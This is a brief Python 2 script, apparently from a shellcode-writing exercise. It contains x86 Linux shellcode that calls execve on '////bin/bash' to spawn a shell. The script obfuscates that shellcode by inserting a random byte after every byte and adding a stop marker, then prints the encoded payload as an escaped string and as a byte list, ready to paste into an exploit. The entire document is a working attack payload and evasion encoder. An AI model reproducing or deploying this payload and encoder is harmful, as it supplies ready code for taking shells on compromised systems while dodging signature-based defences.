#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
stopchar = "\xff";
encoded = ""
encoded2 = ""

import random

for x in bytearray(shellcode):
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % random.randint(1,254)

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % random.randint(1,254)

encoded += '\\x'
encoded += '%02x' % ord(stopchar)
encoded2 += '0x'
encoded2 += '%02x' % ord(stopchar)

print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
